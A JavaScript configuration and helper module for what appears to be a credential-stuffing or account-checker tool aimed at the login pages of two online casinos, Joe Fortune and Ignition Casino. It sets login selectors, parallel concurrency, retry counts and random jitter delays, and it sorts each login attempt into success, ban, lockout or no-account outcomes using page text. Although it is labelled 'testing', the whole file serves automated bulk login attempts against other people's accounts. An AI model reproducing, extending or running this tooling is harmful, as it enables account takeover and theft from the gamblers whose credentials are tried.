/**
 * Joe Ignite Testing — shared config mirroring the original Stagehand script.
 * Edit selectors / URLs here and every worker picks them up.
 */
export const JOE_IGNITE_CONFIG = {
  MAX_ATTEMPTS: 3,
  USE_PARALLEL_SITES: true,
  DEFAULT_CONCURRENCY: 4,

  SITES: {
    joe: {
      name: 'Joe Fortune',
      url: 'https://www.joefortunepokies.win/login',
      selectors: { username: '#username', password: '#password', submit: '#loginSubmit' },
    },
    ignition: {
      name: 'Ignition Casino',
      url: 'https://www.ignitioncasino.ooo/login',
      selectors: { username: '#email', password: '#login-password', submit: '#login-submit' },
    },
  },

  COOKIE_SELECTORS: [
    '.coi-banner__accept',
    '.coi-banner__close',
    'button[onclick*="submitAllCategories"]',
  ],

  OUTCOMES: ['SUCCESS', 'PERM_BAN', 'TEMP_LOCK', 'NO_ACCOUNT', 'CONTINUE', 'ERROR'],
};

/** Jitter in ms → returns a Promise that resolves after a random delay */
export function jitter(minMs, maxMs) {
  const ms = minMs + Math.random() * (maxMs - minMs);
  return new Promise((r) => setTimeout(r, ms));
}

/**
 * Classify the outcome of a login attempt from the page's URL + text content.
 * Mirrors the `evaluate_outcome` step from the Stagehand script.
 */
export function classifyOutcome({ url = '', text = '' }) {
  const u = (url || '').toLowerCase();
  const t = (text || '').toLowerCase();

  if (u.includes('/account') || u.includes('/lobby') || u.includes('/dashboard') ||
      t.includes('logout') || t.includes('sign out') || t.includes('my account')) {
    return 'SUCCESS';
  }
  if (t.includes('permanently') || t.includes('banned') || t.includes('closed') ||
      t.includes('suspended permanently') || t.includes('terminated')) {
    return 'PERM_BAN';
  }
  if (t.includes('temporarily') || t.includes('locked') || t.includes('try again later') ||
      t.includes('too many attempts')) {
    return 'TEMP_LOCK';
  }
  if (t.includes('no account') || t.includes('does not exist') ||
      t.includes('invalid email') || t.includes('invalid username') ||
      t.includes('incorrect email') || t.includes('user not found')) {
    return 'NO_ACCOUNT';
  }
  if (t.includes('incorrect') || t.includes('invalid password') || t.includes('wrong password')) {
    return 'CONTINUE';
  }
  return 'CONTINUE';
}

export function finalOutcomeFromResults({ joe, ignition }) {
  const values = [joe, ignition];
  if (values.includes('SUCCESS')) return 'SUCCESS';
  if (values.includes('PERM_BAN')) return 'PERM_BAN';
  if (values.includes('TEMP_LOCK')) return 'TEMP_LOCK';
  if (values.every((v) => v === 'ERROR')) return 'ERROR';
  return 'NO_ACCOUNT';
}